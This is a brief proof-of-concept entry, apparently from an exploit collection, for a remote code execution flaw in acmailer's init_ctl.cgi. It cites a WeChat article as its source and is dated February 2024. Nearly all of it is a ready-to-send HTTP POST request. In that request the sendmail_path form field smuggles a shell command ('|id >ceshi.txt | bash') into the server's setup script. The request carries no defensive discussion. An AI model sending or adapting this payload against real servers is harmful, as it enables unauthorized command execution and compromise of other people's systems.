# acmailer_init_ctl_rce

from : https://mp.weixin.qq.com/s/qp496PHNJd5K9NlZCOTWkg

2024.02.26 @2 
```
POST /init_ctl.cgi HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0
Connection: close
Content-Length: 150
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

admin_name=u&admin_email=m@m.m&login_id=l&login_pass=l&sendmail_path=|id >ceshi.txt | bash&homeurl=http://&mypath=e
```
